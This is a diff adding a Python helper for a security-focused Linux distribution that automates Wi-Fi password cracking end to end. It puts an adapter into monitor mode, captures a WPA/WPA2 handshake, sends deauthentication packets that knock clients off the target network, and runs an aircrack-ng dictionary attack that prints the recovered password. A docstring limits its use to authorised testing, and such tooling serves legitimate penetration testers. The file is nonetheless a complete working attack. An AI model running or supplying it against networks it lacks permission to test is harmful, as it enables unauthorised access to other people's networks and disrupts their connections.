@@ -1,0 +1,306 @@
+#!/usr/bin/python3
+# SPDX-License-Identifier: GPL-3.0-or-later
+"""Privileged Wi-Fi security audit helper — run via pkexec.
+
+Usage: wifi-audit-helper bssid=XX:XX:XX:XX:XX:XX ssid=NAME channel=N wordlist=/path
+
+Puts the first monitor-capable wireless adapter into monitor mode, captures a
+WPA/WPA2 handshake from the target network, then tests it against a dictionary.
+Restores the adapter and NetworkManager when done.
+
+Output is line-buffered structured messages for WifiAuditBackend to parse:
+  PHASE:<name>
+  LOG:<message>
+  PROGRESS:<tested>:<total>
+  RESULT:<password>
+  NOT_FOUND
+  ERROR:<message>
+
+This tool is for authorised security testing only: on networks you own or have
+written permission to test.  Shadow OS ships it as a convenience for penetration
+testers and security researchers.
+"""
+import os
+import re
+import shutil
+import signal
+import subprocess
+import sys
+import tempfile
+import time
+
+# ---------------------------------------------------------------------------
+# Output helpers (line-buffered so the QML backend sees lines immediately)
+# ---------------------------------------------------------------------------
+def emit(msg: str) -> None:
+    print(msg, flush=True)
+
+def phase(name: str) -> None:
+    emit(f"PHASE:{name}")
+
+def log(msg: str) -> None:
+    emit(f"LOG:{msg}")
+
+def progress(done: int, total: int) -> None:
+    emit(f"PROGRESS:{done}:{total}")
+
+def result(password: str) -> None:
+    emit(f"RESULT:{password}")
+
+def not_found() -> None:
+    emit("NOT_FOUND")
+
+def error(msg: str) -> None:
+    emit(f"ERROR:{msg}")
+    sys.exit(1)
+
+
+# ---------------------------------------------------------------------------
+# Argument parsing  (key=value pairs, no shell)
+# ---------------------------------------------------------------------------
+args = {}
+for token in sys.argv[1:]:
+    if "=" in token:
+        k, v = token.split("=", 1)
+        args[k.strip()] = v.strip()
+
+bssid    = args.get("bssid", "").upper()
+ssid     = args.get("ssid", "")
+channel  = args.get("channel", "0")
+wordlist = args.get("wordlist", "/usr/share/shadow-arsenal/wordlists/wifi-common.txt")
+timeout  = int(args.get("timeout", "120"))
+
+if not re.fullmatch(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid):
+    error(f"invalid BSSID: {bssid!r}  (expected XX:XX:XX:XX:XX:XX)")
+
+if not os.path.isfile(wordlist):
+    error(f"wordlist not found: {wordlist}")
+
+
+# ---------------------------------------------------------------------------
+# Tool checks
+# ---------------------------------------------------------------------------
+REQUIRED = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
+missing = [t for t in REQUIRED if not shutil.which(t)]
+if missing:
+    error("required tools not found: " + ", ".join(missing)
+          + " — install aircrack-ng: sudo apt install aircrack-ng")
+
+
+# ---------------------------------------------------------------------------
+# Find a monitor-capable wireless interface
+# ---------------------------------------------------------------------------
+def find_wireless_interfaces():
+    ifaces = []
+    try:
+        out = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
+        for line in out.splitlines():
+            line = line.strip()
+            if line.startswith("Interface "):
+                ifaces.append(line.split()[1])
+    except Exception:
+        pass
+    if not ifaces:
+        # fallback: look at /sys/class/net
+        try:
+            for name in os.listdir("/sys/class/net"):
+                phy = f"/sys/class/net/{name}/phy80211"
+                if os.path.exists(phy):
+                    ifaces.append(name)
+        except Exception:
+            pass
+    return ifaces
+
+ifaces = find_wireless_interfaces()
+if not ifaces:
+    error("no wireless interface found — plug in a Wi-Fi adapter and try again")
+
+base_iface = ifaces[0]
+log(f"using wireless interface: {base_iface}")
+
+
+# ---------------------------------------------------------------------------
+# State: processes and temp files we must clean up
+# ---------------------------------------------------------------------------
+mon_iface = None
+capdir    = None
+capture_prefix = None
+airodump_proc  = None
+aireplay_proc  = None
+
+
+def cleanup():
+    global airodump_proc, aireplay_proc, mon_iface
+    phase("cleanup")
+    for proc in (airodump_proc, aireplay_proc):
+        if proc and proc.poll() is None:
+            try:
+                proc.terminate()
+                proc.wait(timeout=3)
+            except Exception:
+                proc.kill()
+    if mon_iface:
+        log(f"restoring adapter ({mon_iface} → {base_iface})")
+        subprocess.run(["airmon-ng", "stop", mon_iface],
+                       capture_output=True, timeout=15)
+    # Bring NetworkManager back up after airmon-ng killed it
+    if shutil.which("systemctl"):
+        subprocess.run(["systemctl", "restart", "NetworkManager"],
+                       capture_output=True, timeout=15)
+    if capdir and os.path.isdir(capdir):
+        import shutil as sh
+        sh.rmtree(capdir, ignore_errors=True)
+    log("adapter restored")
+
+
+def handle_signal(signum, frame):
+    cleanup()
+    sys.exit(0)
+
+signal.signal(signal.SIGTERM, handle_signal)
+signal.signal(signal.SIGINT,  handle_signal)
+
+
+# ---------------------------------------------------------------------------
+# 1. Enable monitor mode
+# ---------------------------------------------------------------------------
+phase("monitor")
+log(f"enabling monitor mode on {base_iface}…")
+
+# Kill processes that might interfere (wpa_supplicant, dhclient, etc.)
+subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, timeout=30)
+
+out = subprocess.run(["airmon-ng", "start", base_iface],
+                     capture_output=True, text=True, timeout=30)
+# airmon-ng reports the new interface name in a line like
+# "monitor mode vif enabled for … on [phy0]wlan0mon"
+mon_match = re.search(r"monitor mode.*?enabled.*?on\s+(?:\[\w+\])?\s*(\w+)", out.stdout, re.I)
+if not mon_match:
+    # Also check if it added "mon" suffix
+    candidate = base_iface + "mon"
+    if os.path.exists(f"/sys/class/net/{candidate}"):
+        mon_iface = candidate
+    else:
+        cleanup()
+        error(f"could not enable monitor mode on {base_iface}:\n{out.stdout}{out.stderr}")
+else:
+    mon_iface = mon_match.group(1).strip()
+
+log(f"monitor interface: {mon_iface}")
+
+
+# ---------------------------------------------------------------------------
+# 2. Capture WPA handshake
+# ---------------------------------------------------------------------------
+phase("capture")
+capdir = tempfile.mkdtemp(prefix="shadow-audit-")
+capture_prefix = os.path.join(capdir, "capture")
+
+dump_args = [
+    "airodump-ng",
+    "--bssid", bssid,
+    "--write", capture_prefix,
+    "--output-format", "pcap",
+]
+if channel != "0":
+    dump_args += ["--channel", channel]
+dump_args.append(mon_iface)
+
+log(f"capturing handshake from {ssid} ({bssid}) — this may take up to {timeout}s")
+airodump_proc = subprocess.Popen(dump_args, stdout=subprocess.DEVNULL,
+                                 stderr=subprocess.DEVNULL)
+
+cap_file = capture_prefix + "-01.cap"
+
+def have_handshake() -> bool:
+    """Return True if the .cap file contains a valid WPA handshake."""
+    if not os.path.isfile(cap_file):
+        return False
+    r = subprocess.run(
+        ["aircrack-ng", "-a2", "-b", bssid, cap_file],
+        capture_output=True, text=True, timeout=15,
+    )
+    return "1 handshake" in r.stdout
+
+deauth_sent = False
+start_time  = time.time()
+
+while True:
+    elapsed = time.time() - start_time
+    if elapsed > timeout:
+        airodump_proc.terminate()
+        airodump_proc.wait(timeout=5)
+        cleanup()
+        error(f"timed out after {timeout}s without capturing a handshake "
+              f"— make sure a client is connected to {ssid!r} and try again")
+
+    if have_handshake():
+        airodump_proc.terminate()
+        airodump_proc.wait(timeout=5)
+        log("WPA handshake captured")
+        break
+
+    # After 10s without a handshake send deauth packets to force a reconnection.
+    if not deauth_sent and elapsed >= 10:
+        phase("deauth")
+        log("sending deauthentication packets to force a handshake…")
+        aireplay_proc = subprocess.Popen(
+            ["aireplay-ng", "--deauth", "10", "-a", bssid, mon_iface],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        aireplay_proc.wait(timeout=20)
+        aireplay_proc = None
+        deauth_sent = True
+        phase("capture")
+
+    time.sleep(2)
+
+
+# ---------------------------------------------------------------------------
+# 3. Dictionary attack
+# ---------------------------------------------------------------------------
+phase("cracking")
+word_count = 0
+try:
+    with open(wordlist, "rb") as fh:
+        for _ in fh:
+            word_count += 1
+except Exception:
+    pass
+
+log(f"testing {word_count:,} passwords against captured handshake…")
+progress(0, word_count)
+
+crack_proc = subprocess.Popen(
+    ["aircrack-ng", "-a2", "-b", bssid, "-w", wordlist, cap_file],
+    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
+)
+
+found_pw = None
+tested   = 0
+
+for line in crack_proc.stdout:
+    line = line.rstrip()
+    # aircrack-ng progress: "Current passphrase: ..."
+    if "Current passphrase:" in line:
+        m = re.search(r"(\d+)\s+/\s*(\d+)", line)
+        if m:
+            tested = int(m.group(1))
+            total  = int(m.group(2))
+            progress(tested, total)
+    # Key found
+    elif "KEY FOUND!" in line:
+        m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", line)
+        if m:
+            found_pw = m.group(1)
+            break
+
+crack_proc.terminate()
+crack_proc.wait(timeout=5)
+
+cleanup()
+
+if found_pw is not None:
+    result(found_pw)
+else:
+    not_found()
